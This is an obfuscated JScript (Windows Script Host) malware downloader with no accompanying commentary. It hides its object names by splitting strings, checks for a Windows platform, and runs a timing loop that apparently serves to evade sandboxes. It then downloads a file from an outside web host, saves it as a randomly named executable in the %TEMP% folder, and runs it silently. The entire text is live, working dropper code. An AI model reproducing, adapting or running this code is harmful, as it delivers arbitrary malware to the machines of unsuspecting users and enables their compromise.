var UP = false;
var N = "Create"+"Object";
var HC = function I() {return WScript[N]("WScript"+".Shell");}(), YL = 11;
var OG = "MSXML2"+".XMLHTTP";
var N0 = 2;
var S = N0 - 2;
function Z(XC){HC["Run"](XC, S, S);};
function V(){return OG + "";};
function C(DU0, VW){S = S * 1; return DU0 - VW;};
function K(){return N;};
/*@cc_on
  @if (@_win32 || @_win64)
    UP = true;
  @end
@*/
if (UP)
{
var DR = "";
function P(){return 22;};
var DU = 0; var TV = 0;
function A()
{
var BH = new this["Date"]();
var V0 = BH["getUTCMilliseconds"]();
WScript["Sleep"](P());
var BH = new this["Date"]();
var G0 = BH["getUTCMilliseconds"]();
WScript["Sleep"](P());
var BH = new this["Date"]();
var CZ = BH["getUTCMilliseconds"]();
var DU = "ZF";
DU = C(G0, V0);
var TV = "M";
TV = C(CZ, G0);
DR = "open";
return C(DU, TV);
}
var R = false;
var KH = false;
for (var W = S; W < P() * 1; W++){if (A() != S){
R = true; 
TV = "31" + 11 * DU + TV; 
KH = true; 
break;
}}
function G() {return ((R == true) && (R == KH)) ? 1 : S;};
if (R && G() && KH){
function JN() {return HC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WGw6yCD6of21bd.ex" + "e";};
 Q = V();
 IA = WScript[N](Q);
 var DW = 1;
do { 
	for (;DW;){
	try {
		if (DW == 1)
		{
			IA[DR]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			IA["send"]();
			I0 = "Sleep";
			DW = 2;
		}
		WScript[I0](P() + 120); 
		if (IA["readystate"] < 2 * 2) continue;
		DW = S;
		function IZ(EY) {var SL = (1, 2, 3, 4, 5, EY); return SL;};
		E = WScript[K()]("ADODB.Stream");
		Q = E;
		Q[DR]();
		Q["type"] = IZ(1);
		Q["write"](IA["ResponseBody"]);
		E["position"] = IZ(S);
		Q["Save" + "ToFile"](JN(), 2);
		E["cl"+"ose"]();
		DQ = JN();
		Z(DQ);
	} catch(QS){};};
}while (DW);
}
}

